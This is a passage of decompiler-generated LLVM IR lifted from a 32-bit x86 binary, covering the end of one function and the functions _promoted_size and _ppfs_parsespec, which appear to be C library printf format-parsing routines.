  %v0_804f0a6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0a6 = inttoptr i32 %v0_804f0a6 to x86_fp80*
  %v2_804f0a6 = load x86_fp80, x86_fp80* %v1_804f0a6, align 4
  %v2_804f0a8 = load i32, i32* %ebx.global-to-local, align 4
  %v3_804f0a8 = inttoptr i32 %v2_804f0a8 to x86_fp80*
  store x86_fp80 %v2_804f0a6, x86_fp80* %v3_804f0a8, align 4
  br label %dec_label_pc_804f0b6

dec_label_pc_804f0ac:                             ; preds = %dec_label_pc_804f055, %dec_label_pc_804f063, %dec_label_pc_804f073
  %v1_804f0ac = add i32 %v3_804f050, 4
  store i32 %v1_804f0ac, i32* %eax.global-to-local, align 4
  store i32 %v1_804f0ac, i32* %v2_804f050, align 4
  %v0_804f0b2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f0b2 = inttoptr i32 %v0_804f0b2 to i32*
  %v2_804f0b2 = load i32, i32* %v1_804f0b2, align 4
  store i32 %v2_804f0b2, i32* %eax.global-to-local, align 4
  %v1_804f0b4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f0b4 = inttoptr i32 %v1_804f0b4 to i32*
  store i32 %v2_804f0b2, i32* %v2_804f0b4, align 4
  br label %dec_label_pc_804f0b6

dec_label_pc_804f0b6:                             ; preds = %dec_label_pc_804f09d, %dec_label_pc_804f08e, %dec_label_pc_804f07c, %dec_label_pc_804f0ac
  %v0_804f0b6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f0b6 = add i32 %v0_804f0b6, 12
  store i32 %v1_804f0b6, i32* %ebx.global-to-local, align 4
  %v0_804f0b9.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_804f0ba.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804f0b9

dec_label_pc_804f0b9:                             ; preds = %dec_label_pc_804f047, %dec_label_pc_804f0b6
  %v1_804f0ba = phi i32 [ %v1_804f0ba22, %dec_label_pc_804f047 ], [ %v1_804f0ba.pre, %dec_label_pc_804f0b6 ]
  %v0_804f0b9 = phi i32 [ %v1_804f04721, %dec_label_pc_804f047 ], [ %v0_804f0b9.pre, %dec_label_pc_804f0b6 ]
  %v1_804f0b9 = add i32 %v0_804f0b9, 1
  store i32 %v1_804f0b9, i32* %esi.global-to-local, align 4
  %v2_804f0ba = add i32 %v1_804f0ba, 28
  %v3_804f0ba = inttoptr i32 %v2_804f0ba to i32*
  %v4_804f0ba = load i32, i32* %v3_804f0ba, align 4
  %v5_804f0bd = icmp slt i32 %v1_804f0b9, %v4_804f0ba
  br i1 %v5_804f0bd, label %dec_label_pc_804f047, label %dec_label_pc_804f0ba.dec_label_pc_804f0ef.loopexit_crit_edge

dec_label_pc_804f0c1:                             ; preds = %entry
  br i1 %v1_804f0c8, label %dec_label_pc_804f0d8, label %dec_label_pc_804f0ca

dec_label_pc_804f0ca:                             ; preds = %dec_label_pc_804f0c1
  %v1_804f0ca = add i32 %arg1, 36
  %v2_804f0ca = inttoptr i32 %v1_804f0ca to i8*
  %v3_804f0ca = load i8, i8* %v2_804f0ca, align 1
  %v2_804f0ce = zext i8 %v3_804f0ca to i32
  %v3_804f0ce = mul nuw nsw i32 %v2_804f0ce, 12
  store i32 %v3_804f0ce, i32* %eax.global-to-local, align 4
  %v2_804f0d1 = add i32 %arg1, 68
  %v3_804f0d1 = add i32 %v2_804f0d1, %v3_804f0ce
  %v4_804f0d1 = inttoptr i32 %v3_804f0d1 to i32*
  %v5_804f0d1 = load i32, i32* %v4_804f0d1, align 4
  store i32 %v5_804f0d1, i32* %eax.global-to-local, align 4
  store i32 %v5_804f0d1, i32* %v2_804f0c1, align 4
  %v0_804f0d8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804f0d8

dec_label_pc_804f0d8:                             ; preds = %dec_label_pc_804f0c1, %dec_label_pc_804f0ca
  %v1_804f0ec = phi i32 [ %arg1, %dec_label_pc_804f0c1 ], [ %v0_804f0d8.pre, %dec_label_pc_804f0ca ]
  %v1_804f0d8 = add i32 %v1_804f0ec, 4
  %v2_804f0d8 = inttoptr i32 %v1_804f0d8 to i32*
  %v3_804f0d8 = load i32, i32* %v2_804f0d8, align 4
  %v8_804f0d8 = icmp eq i32 %v3_804f0d8, -2147483648
  %v1_804f0df = icmp eq i1 %v8_804f0d8, false
  br i1 %v1_804f0df, label %dec_label_pc_804f0ef, label %dec_label_pc_804f0e1

dec_label_pc_804f0e1:                             ; preds = %dec_label_pc_804f0d8
  %v1_804f0e1 = add i32 %v1_804f0ec, 37
  %v2_804f0e1 = inttoptr i32 %v1_804f0e1 to i8*
  %v3_804f0e1 = load i8, i8* %v2_804f0e1, align 1
  %v2_804f0e5 = zext i8 %v3_804f0e1 to i32
  %v3_804f0e5 = mul nuw nsw i32 %v2_804f0e5, 12
  store i32 %v3_804f0e5, i32* %eax.global-to-local, align 4
  %v1_804f0e8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804f0e8 = add nsw i32 %v3_804f0e5, -12
  %v3_804f0e8 = add i32 %v2_804f0e8, %v1_804f0e8
  %v4_804f0e8 = inttoptr i32 %v3_804f0e8 to i32*
  %v5_804f0e8 = load i32, i32* %v4_804f0e8, align 4
  store i32 %v5_804f0e8, i32* %eax.global-to-local, align 4
  store i32 %v5_804f0e8, i32* %v2_804f0d8, align 4
  %v0_804f0ef.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804f0ef

dec_label_pc_804f0ba.dec_label_pc_804f0ef.loopexit_crit_edge: ; preds = %dec_label_pc_804f0b9
  br label %dec_label_pc_804f0ef.loopexit

dec_label_pc_804f0ef.loopexit:                    ; preds = %dec_label_pc_804f0ba.dec_label_pc_804f0ef.loopexit_crit_edge, %dec_label_pc_804f043
  %v1_804f0ba.lcssa = phi i32 [ %v1_804f0ba, %dec_label_pc_804f0ba.dec_label_pc_804f0ef.loopexit_crit_edge ], [ %v1_804f0ba15, %dec_label_pc_804f043 ]
  br label %dec_label_pc_804f0ef

dec_label_pc_804f0ef:                             ; preds = %dec_label_pc_804f0ef.loopexit, %dec_label_pc_804f0d8, %dec_label_pc_804f0e1
  %v10_804f0f6 = phi i32 [ %v1_804f0ba.lcssa, %dec_label_pc_804f0ef.loopexit ], [ %v1_804f0ec, %dec_label_pc_804f0d8 ], [ %v0_804f0ef.pre, %dec_label_pc_804f0e1 ]
  %v1_804f0ef = add i32 %v10_804f0f6, 8
  %v2_804f0ef = inttoptr i32 %v1_804f0ef to i32*
  %v3_804f0ef = load i32, i32* %v2_804f0ef, align 4
  store i32 %v3_804f0ef, i32* %eax.global-to-local, align 4
  %v2_804f0f2 = icmp slt i32 %v3_804f0ef, 0
  %v1_804f0f4 = icmp eq i1 %v2_804f0f2, false
  br i1 %v1_804f0f4, label %dec_label_pc_804f10a, label %dec_label_pc_804f0f6

dec_label_pc_804f0f6:                             ; preds = %dec_label_pc_804f0ef
  %v1_804f0f6 = add i32 %v10_804f0f6, 16
  %v2_804f0f6 = inttoptr i32 %v1_804f0f6 to i32*
  %v3_804f0f6 = load i32, i32* %v2_804f0f6, align 4
  %v4_804f0f6 = or i32 %v3_804f0f6, 8
  store i32 %v4_804f0f6, i32* %v2_804f0f6, align 4
  %v0_804f0fa = load i32, i32* %eax.global-to-local, align 4
  %v1_804f0fa = sub i32 0, %v0_804f0fa
  store i32 %v1_804f0fa, i32* %eax.global-to-local, align 4
  %v1_804f0fc = load i32, i32* @ecx, align 4
  %v2_804f0fc = add i32 %v1_804f0fc, 8
  %v3_804f0fc = inttoptr i32 %v2_804f0fc to i32*
  store i32 %v1_804f0fa, i32* %v3_804f0fc, align 4
  %v0_804f0ff = load i32, i32* @ecx, align 4
  %v1_804f0ff = add i32 %v0_804f0ff, 16
  %v2_804f0ff = inttoptr i32 %v1_804f0ff to i32*
  %v3_804f0ff = load i32, i32* %v2_804f0ff, align 4
  %v4_804f0ff = and i32 %v3_804f0ff, -2
  store i32 %v4_804f0ff, i32* %v2_804f0ff, align 4
  %v0_804f103 = load i32, i32* @ecx, align 4
  %v1_804f103 = add i32 %v0_804f103, 20
  %v2_804f103 = inttoptr i32 %v1_804f103 to i32*
  store i32 32, i32* %v2_804f103, align 4
  %v0_804f10c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f10a

dec_label_pc_804f10a:                             ; preds = %dec_label_pc_804f0ef, %dec_label_pc_804f0f6
  %v0_804f10c = phi i32 [ %v3_804f0ef, %dec_label_pc_804f0ef ], [ %v0_804f10c.pre, %dec_label_pc_804f0f6 ]
  %v2_804f10a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f10a, i32* @ebx, align 4
  ret i32 %v0_804f10c

; uselistorder directives
  uselistorder i32 %v3_804f0e5, { 1, 0 }
  uselistorder i32 %v3_804f0ce, { 1, 0 }
  uselistorder i32 %v1_804f0b9, { 2, 1, 0 }
  uselistorder i32 %v1_804f0ba, { 1, 2, 0 }
  uselistorder i32 %v3_804f050, { 1, 0, 2 }
  uselistorder i32* %v2_804f050, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804f04b, { 1, 0 }
  uselistorder i32 %v6_804f047, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_804f04721, { 1, 0 }
  uselistorder i32 %v1_804f0ba15, { 2, 0, 1 }
  uselistorder i1 %v1_804f0c8, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_804f10a, { 1, 0 }
  uselistorder label %dec_label_pc_804f0ef, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f0d8, { 1, 0 }
  uselistorder label %dec_label_pc_804f0b9, { 1, 0 }
  uselistorder label %dec_label_pc_804f0b6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f0ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f047, { 1, 0 }
  uselistorder label %dec_label_pc_804f043, { 1, 0 }
  uselistorder label %dec_label_pc_804f029, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f110 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f117

dec_label_pc_804f117:                             ; preds = %dec_label_pc_804f117, %entry
  %v0_804f117 = phi i32 [ ptrtoint (i8** @global_var_80536ea.105 to i32), %entry ], [ %v1_804f117, %dec_label_pc_804f117 ]
  %v1_804f117 = add i32 %v0_804f117, -2
  %v1_804f11a = inttoptr i32 %v1_804f117 to i16*
  %v2_804f11a = load i16, i16* %v1_804f11a, align 2
  %v3_804f11a = sext i16 %v2_804f11a to i32
  %v12_804f11d = icmp ne i32 %v3_804f11a, %v0_804f110
  %v6_804f127 = icmp ugt i32 %v1_804f117, ptrtoint (i32* @global_var_80536d2.106 to i32)
  %or.cond = and i1 %v6_804f127, %v12_804f11d
  br i1 %or.cond, label %dec_label_pc_804f117, label %dec_label_pc_804f129

dec_label_pc_804f129:                             ; preds = %dec_label_pc_804f117
  %.pre = add i32 %v0_804f117, -134559444
  %v2_804f12f = sdiv i32 %.pre, 2
  store i32 %v2_804f12f, i32* @edx, align 4
  %v1_804f131 = add i32 %v2_804f12f, ptrtoint (i8** @global_var_80536ea.105 to i32)
  %v2_804f131 = inttoptr i32 %v1_804f131 to i8*
  %v3_804f131 = load i8, i8* %v2_804f131, align 1
  %v4_804f131 = zext i8 %v3_804f131 to i32
  ret i32 %v4_804f131

; uselistorder directives
  uselistorder i32 %v2_804f12f, { 1, 0 }
  uselistorder i32 %v1_804f117, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80536ea.105 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f13a = load i32, i32* @edi, align 4
  %v0_804f13b = load i32, i32* @esi, align 4
  %v0_804f13c = load i32, i32* @ebx, align 4
  store i32 %v0_804f13c, i32* %stack_var_-16, align 4
  %v4_804f13c = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804f168 = add i32 %tmp76, 24
  %v2_804f168 = inttoptr i32 %v1_804f168 to i32*
  %v3_804f168 = load i32, i32* %v2_804f168, align 4
  store i32 %v3_804f168, i32* %eax.global-to-local, align 4
  %v1_804f16f = add i32 %tmp76, 16
  %v2_804f16f = inttoptr i32 %v1_804f16f to i32*
  %v3_804f16f = load i32, i32* %v2_804f16f, align 4
  %v1_804f172 = and i32 %v3_804f16f, 128
  %v2_804f172 = icmp eq i32 %v1_804f172, 0
  store i32 %v1_804f172, i32* %edi.global-to-local, align 4
  %v1_804f178 = icmp eq i1 %v2_804f172, false
  br i1 %v1_804f178, label %dec_label_pc_804f18b, label %dec_label_pc_804f17a

dec_label_pc_804f17a:                             ; preds = %entry
  %v2_804f17a = load i32, i32* %arg1, align 4
  br label %dec_label_pc_804f1d8.outer

dec_label_pc_804f185:                             ; preds = %dec_label_pc_804f313
  %v1_804f185 = add i32 %v0_804f313.pre.pre, 1
  store i32 %v1_804f185, i32* @esi, align 4
  br label %dec_label_pc_804f323

dec_label_pc_804f18b:                             ; preds = %entry
  %v15_804f13d = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804f18d

dec_label_pc_804f18d:                             ; preds = %dec_label_pc_804f1b5.dec_label_pc_804f18d_crit_edge, %dec_label_pc_804f18b
  %v2_804f19e = phi i32 [ %v2_804f19e.pre, %dec_label_pc_804f1b5.dec_label_pc_804f18d_crit_edge ], [ %v15_804f13d, %dec_label_pc_804f18b ]
  %v3_804f19e = phi i32 [ %v1_804f1b5, %dec_label_pc_804f1b5.dec_label_pc_804f18d_crit_edge ], [ 0, %dec_label_pc_804f18b ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804f191 = mul i32 %v3_804f19e, 4
  store i32 %v1_804f191, i32* @ecx, align 4
  %v2_804f198 = load i32, i32* %arg1, align 4
  store i32 %v2_804f198, i32* @edx, align 4
  %v2_804f19a = add i32 %v1_804f191, -4
  %v3_804f19a = add i32 %v2_804f19a, %v2_804f198
  %v4_804f19a = inttoptr i32 %v3_804f19a to i32*
  %v5_804f19a = load i32, i32* %v4_804f19a, align 4
  store i32 %v5_804f19a, i32* %eax.global-to-local, align 4
  %v1_804f19e = trunc i32 %v5_804f19a to i8
  %v4_804f19e = add i32 %v2_804f19e, 36
  %v5_804f19e = add i32 %v4_804f19e, %v3_804f19e
  %v6_804f19e = inttoptr i32 %v5_804f19e to i8*
  store i8 %v1_804f19e, i8* %v6_804f19e, align 1
  %v0_804f1a2 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1a2 = urem i32 %v0_804f1a2, 256
  %v2_804f1a2 = load i32, i32* @ebx, align 4
  %v3_804f1a2 = and i32 %v2_804f1a2, -256
  %v4_804f1a2 = or i32 %v3_804f1a2, %v1_804f1a2
  store i32 %v4_804f1a2, i32* @ebx, align 4
  %v1_804f1a4 = mul i32 %v0_804f1a2, 16777216
  %v2_804f1a4 = sdiv i32 %v1_804f1a4, 16777216
  store i32 %v2_804f1a4, i32* %eax.global-to-local, align 4
  %v1_804f1a7 = load i32, i32* @edx, align 4
  %v2_804f1a7 = load i32, i32* @ecx, align 4
  %v3_804f1a7 = add i32 %v1_804f1a7, -4
  %v4_804f1a7 = add i32 %v3_804f1a7, %v2_804f1a7
  %v5_804f1a7 = inttoptr i32 %v4_804f1a7 to i32*
  %v6_804f1a7 = load i32, i32* %v5_804f1a7, align 4
  %v17_804f1a7 = icmp eq i32 %v2_804f1a4, %v6_804f1a7
  %v1_804f1ab = icmp eq i1 %v17_804f1a7, false
  br i1 %v1_804f1ab, label %dec_label_pc_804f4fd, label %dec_label_pc_804f1b1

dec_label_pc_804f1b1:                             ; preds = %dec_label_pc_804f18d
  %v3_804f1b1 = trunc i32 %v0_804f1a2 to i8
  %v4_804f1b1 = icmp eq i8 %v3_804f1b1, 0
  br i1 %v4_804f1b1, label %dec_label_pc_804f1bb, label %dec_label_pc_804f1b5

dec_label_pc_804f1b5:                             ; preds = %dec_label_pc_804f1b1
  %v0_804f1b5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1b5 = add i32 %v0_804f1b5, 1
  store i32 %v1_804f1b5, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f1b5, 32
  br i1 %tmp, label %dec_label_pc_804f1b5.dec_label_pc_804f18d_crit_edge, label %dec_label_pc_804f1bb

dec_label_pc_804f1b5.dec_label_pc_804f18d_crit_edge: ; preds = %dec_label_pc_804f1b5
  %v2_804f19e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f18d

dec_label_pc_804f1bb:                             ; preds = %dec_label_pc_804f1b5, %dec_label_pc_804f1b1
  %v2_804f1c0 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804f1d8.outer

dec_label_pc_804f1d8.outer:                       ; preds = %dec_label_pc_804f1bb, %dec_label_pc_804f17a, %dec_label_pc_804f2f5
  %v0_804f1e4.ph94 = phi i32 [ %v1_804f2f5, %dec_label_pc_804f2f5 ], [ %v2_804f17a, %dec_label_pc_804f17a ], [ %v2_804f1c0, %dec_label_pc_804f1bb ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804f2f5 ], [ %tmp66, %dec_label_pc_804f17a ], [ %tmp66, %dec_label_pc_804f1bb ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804f17e, %dec_label_pc_804f2f5 ], [ 0, %dec_label_pc_804f17a ], [ 0, %dec_label_pc_804f1bb ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804f2f5 ], [ %v3_804f168, %dec_label_pc_804f17a ], [ %v3_804f168, %dec_label_pc_804f1bb ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804f2f5 ], [ 0, %dec_label_pc_804f17a ], [ 0, %dec_label_pc_804f1bb ]
  %v7_804f1df = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804f1df = trunc i64 %v7_804f1df to i32
  %v2_804f1e7 = add i32 %v8_804f1df, 80
  br label %dec_label_pc_804f1d8

dec_label_pc_804f1d8:                             ; preds = %dec_label_pc_804f1d8.outer, %dec_label_pc_804f295
  %v0_804f1e4 = phi i32 [ %v0_804f2a2, %dec_label_pc_804f295 ], [ %v0_804f1e4.ph94, %dec_label_pc_804f1d8.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804f295 ], [ %stack_var_-32.1.ph, %dec_label_pc_804f1d8.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804f295 ], [ %stack_var_-88.1.ph, %dec_label_pc_804f1d8.outer ]
  store i32 %v0_804f1e4, i32* @edx, align 4
  %v1_804f1d8 = inttoptr i32 %v0_804f1e4 to i8*
  %v2_804f1d8 = load i8, i8* %v1_804f1d8, align 1
  %v11_804f1d8 = icmp eq i8 %v2_804f1d8, 42
  store i32 %v0_804f1e4, i32* @esi, align 4
  %v1_804f1dd = icmp eq i1 %v11_804f1d8, false
  br i1 %v1_804f1dd, label %dec_label_pc_804f1ef, label %dec_label_pc_804f1df

dec_label_pc_804f1df:                             ; preds = %dec_label_pc_804f1d8
  store i32 %v8_804f1df, i32* %eax.global-to-local, align 4
  %v1_804f1e4 = add i32 %v0_804f1e4, 1
  store i32 %v1_804f1e4, i32* @esi, align 4
  %v0_804f1e7 = load i32, i32* @esp, align 4
  %v3_804f1e7 = add i32 %v2_804f1e7, %v0_804f1e7
  %v4_804f1e7 = inttoptr i32 %v3_804f1e7 to i32*
  store i32 0, i32* %v4_804f1e7, align 4
  %v0_804f209.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804f1ef

dec_label_pc_804f1ef:                             ; preds = %dec_label_pc_804f1d8, %dec_label_pc_804f1df
  %v0_804f209.pre = phi i32 [ %v0_804f1e4, %dec_label_pc_804f1d8 ], [ %v0_804f209.pre.pre, %dec_label_pc_804f1df ]
  %v0_804f1ef = load i32, i32* @global_var_8055684, align 4
  store i32 %v0_804f1ef, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804f209.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f209

dec_label_pc_804f1f9:                             ; preds = %dec_label_pc_804f209
  %v1_804f1f9 = add i32 %v1_804f201, -4094
  %v6_804f1f9 = sub i32 4093, %v1_804f201
  %v7_804f1f9 = and i32 %v6_804f1f9, %v1_804f201
  %v8_804f1f9 = icmp slt i32 %v7_804f1f9, 0
  %v9_804f1f9 = icmp eq i32 %v1_804f1f9, 0
  %v10_804f1f9 = icmp slt i32 %v1_804f1f9, 0
  %v3_804f1ff = icmp eq i1 %v10_804f1f9, %v8_804f1f9
  %v4_804f1ff = icmp eq i1 %v9_804f1f9, false
  %v5_804f1ff = and i1 %v4_804f1ff, %v3_804f1ff
  br i1 %v5_804f1ff, label %dec_label_pc_804f208, label %dec_label_pc_804f201

dec_label_pc_804f201:                             ; preds = %dec_label_pc_804f1f9
  %v3_804f201 = mul i32 %v1_804f201, 10
  store i32 %v3_804f201, i32* %eax.global-to-local, align 4
  %v2_804f204 = add i32 %v3_804f201, -48
  %v3_804f204 = add i32 %v2_804f204, %v2_804f20b
  store i32 %v3_804f204, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f208

dec_label_pc_804f208:                             ; preds = %dec_label_pc_804f1f9, %dec_label_pc_804f201
  %v0_804f22332 = phi i32 [ %v1_804f201, %dec_label_pc_804f1f9 ], [ %v3_804f204, %dec_label_pc_804f201 ]
  %v4_804f20928 = phi i32 [ %v6_804f209, %dec_label_pc_804f1f9 ], [ %v3_804f201, %dec_label_pc_804f201 ]
  %v1_804f208 = add i32 %v0_804f208, 1
  store i32 %v1_804f208, i32* @esi, align 4
  br label %dec_label_pc_804f209

dec_label_pc_804f209:                             ; preds = %dec_label_pc_804f1ef, %dec_label_pc_804f208
  %v1_804f201 = phi i32 [ 0, %dec_label_pc_804f1ef ], [ %v0_804f22332, %dec_label_pc_804f208 ]
  %v4_804f209 = phi i32 [ %v4_804f209.pre, %dec_label_pc_804f1ef ], [ %v4_804f20928, %dec_label_pc_804f208 ]
  %v0_804f208 = phi i32 [ %v0_804f209.pre, %dec_label_pc_804f1ef ], [ %v1_804f208, %dec_label_pc_804f208 ]
  %v1_804f209 = inttoptr i32 %v0_804f208 to i8*
  %v2_804f209 = load i8, i8* %v1_804f209, align 1
  %v3_804f209 = zext i8 %v2_804f209 to i32
  %v5_804f209 = and i32 %v4_804f209, -256
  %v6_804f209 = or i32 %v3_804f209, %v5_804f209
  store i32 %v6_804f209, i32* %eax.global-to-local, align 4
  %v2_804f20b = sext i8 %v2_804f209 to i32
  store i32 %v2_804f20b, i32* @ecx, align 4
  %v2_804f20e = mul nsw i32 %v2_804f20b, 2
  %v3_804f20e = add i32 %v2_804f20e, %v0_804f1ef
  %v4_804f20e = inttoptr i32 %v3_804f20e to i8*
  %v5_804f20e = load i8, i8* %v4_804f20e, align 1
  %v6_804f20e = and i8 %v5_804f20e, 8
  %v7_804f20e = icmp eq i8 %v6_804f20e, 0
  %v1_804f213 = icmp eq i1 %v7_804f20e, false
  br i1 %v1_804f213, label %dec_label_pc_804f1f9, label %dec_label_pc_804f215

dec_label_pc_804f215:                             ; preds = %dec_label_pc_804f209
  %v0_804f215 = load i32, i32* @edx, align 4
  %v1_804f215 = add i32 %v0_804f215, -1
  %v2_804f215 = inttoptr i32 %v1_804f215 to i8*
  %v3_804f215 = load i8, i8* %v2_804f215, align 1
  %v12_804f215 = icmp eq i8 %v3_804f215, 37
  %v1_804f219 = icmp eq i1 %v12_804f215, false
  br i1 %v1_804f219, label %dec_label_pc_804f2ac, label %dec_label_pc_804f21f

dec_label_pc_804f21f:                             ; preds = %dec_label_pc_804f215
  %v10_804f21f = icmp eq i8 %v2_804f209, 36
  %v1_804f221 = icmp eq i1 %v10_804f21f, false
  br i1 %v1_804f221, label %dec_label_pc_804f253, label %dec_label_pc_804f223

dec_label_pc_804f223:                             ; preds = %dec_label_pc_804f21f
  %tmp89 = icmp slt i32 %v1_804f201, 1
  br i1 %tmp89, label %dec_label_pc_804f253, label %dec_label_pc_804f227

dec_label_pc_804f227:                             ; preds = %dec_label_pc_804f223
  %v4_804f227 = icmp eq i32 %stack_var_-88.1, 0
  %v1_804f22c = add i32 %v0_804f208, 1
  store i32 %v1_804f22c, i32* @edx, align 4
  br i1 %v4_804f227, label %dec_label_pc_804f4fd, label %dec_label_pc_804f235

dec_label_pc_804f235:                             ; preds = %dec_label_pc_804f227
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804f23d = sub i32 %v1_804f201, %stack_var_-88.1
  %v8_804f23d = xor i32 %v1_804f201, %stack_var_-88.1
  %v9_804f23d = xor i32 %v2_804f23d, %v1_804f201
  %v10_804f23d = and i32 %v9_804f23d, %v8_804f23d
  %v11_804f23d = icmp slt i32 %v10_804f23d, 0
  %v12_804f23d = icmp eq i32 %v2_804f23d, 0
  %v13_804f23d = icmp slt i32 %v2_804f23d, 0
  %v3_804f23f = icmp ne i1 %v13_804f23d, %v11_804f23d
  %v4_804f23f = or i1 %v12_804f23d, %v3_804f23f
  %stack_var_-88.1.v0_804f241 = select i1 %v4_804f23f, i32 %stack_var_-88.1, i32 %v1_804f201
  br label %dec_label_pc_804f24f

dec_label_pc_804f24f:                             ; preds = %dec_label_pc_804f263, %dec_label_pc_804f235, %dec_label_pc_804f267
  %v0_804f24f = phi i32 [ %v1_804f22c, %dec_label_pc_804f235 ], [ %v0_804f215, %dec_label_pc_804f267 ], [ %v0_804f215, %dec_label_pc_804f263 ]
  %stack_var_-32.2 = phi i32 [ %v1_804f201, %dec_label_pc_804f235 ], [ %stack_var_-32.1, %dec_label_pc_804f267 ], [ %stack_var_-32.1, %dec_label_pc_804f263 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804f241, %dec_label_pc_804f235 ], [ 0, %dec_label_pc_804f267 ], [ 0, %dec_label_pc_804f263 ]
  store i32 %v0_804f24f, i32* @esi, align 4
  br label %dec_label_pc_804f276

dec_label_pc_804f253:                             ; preds = %dec_label_pc_804f223, %dec_label_pc_804f21f
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804f263, label %dec_label_pc_804f25a

dec_label_pc_804f25a:                             ; preds = %dec_label_pc_804f253
  %v10_804f25a = icmp eq i8 %v2_804f209, 109
  br i1 %v10_804f25a, label %dec_label_pc_804f2ac, label %dec_label_pc_804f4fd

dec_label_pc_804f263:                             ; preds = %dec_label_pc_804f253
  %tmp153 = icmp ugt i32 %v0_804f208, %v0_804f215
  br i1 %tmp153, label %dec_label_pc_804f267, label %dec_label_pc_804f24f

dec_label_pc_804f267:                             ; preds = %dec_label_pc_804f263
  %v1_804f267 = inttoptr i32 %v0_804f215 to i8*
  %v2_804f267 = load i8, i8* %v1_804f267, align 1
  %v8_804f267 = icmp eq i8 %v2_804f267, 48
  br i1 %v8_804f267, label %dec_label_pc_804f24f, label %dec_label_pc_804f2ac

dec_label_pc_804f276:                             ; preds = %dec_label_pc_804f287, %dec_label_pc_804f24f
  %v0_804f2a2 = phi i32 [ %v1_804f287, %dec_label_pc_804f287 ], [ %v0_804f24f, %dec_label_pc_804f24f ]
  %v4_804f28035 = phi i32 [ %v6_804f280, %dec_label_pc_804f287 ], [ %v6_804f209, %dec_label_pc_804f24f ]
  store i32 ptrtoint ([8 x i8]* @global_var_80536ca.107 to i32), i32* %edx.global-to-local, align 4
  %v1_804f283 = inttoptr i32 %v0_804f2a2 to i8*
  br label %dec_label_pc_804f280

dec_label_pc_804f280:                             ; preds = %dec_label_pc_804f291, %dec_label_pc_804f276
  %v4_804f280 = phi i32 [ %v4_804f28035, %dec_label_pc_804f276 ], [ %v6_804f280, %dec_label_pc_804f291 ]
  %v0_804f282 = phi i32 [ ptrtoint ([8 x i8]* @global_var_80536ca.107 to i32), %dec_label_pc_804f276 ], [ %v1_804f282, %dec_label_pc_804f291 ]
  %v0_804f291 = phi i32 [ 1, %dec_label_pc_804f276 ], [ %v2_804f291, %dec_label_pc_804f291 ]
  store i32 %v0_804f291, i32* @ecx, align 4
  %v1_804f280 = inttoptr i32 %v0_804f282 to i8*
  %v2_804f280 = load i8, i8* %v1_804f280, align 1
  %v3_804f280 = zext i8 %v2_804f280 to i32
  %v5_804f280 = and i32 %v4_804f280, -256
  %v6_804f280 = or i32 %v3_804f280, %v5_804f280
  store i32 %v6_804f280, i32* %eax.global-to-local, align 4
  %v1_804f282 = add i32 %v0_804f282, 1
  store i32 %v1_804f282, i32* @edx, align 4
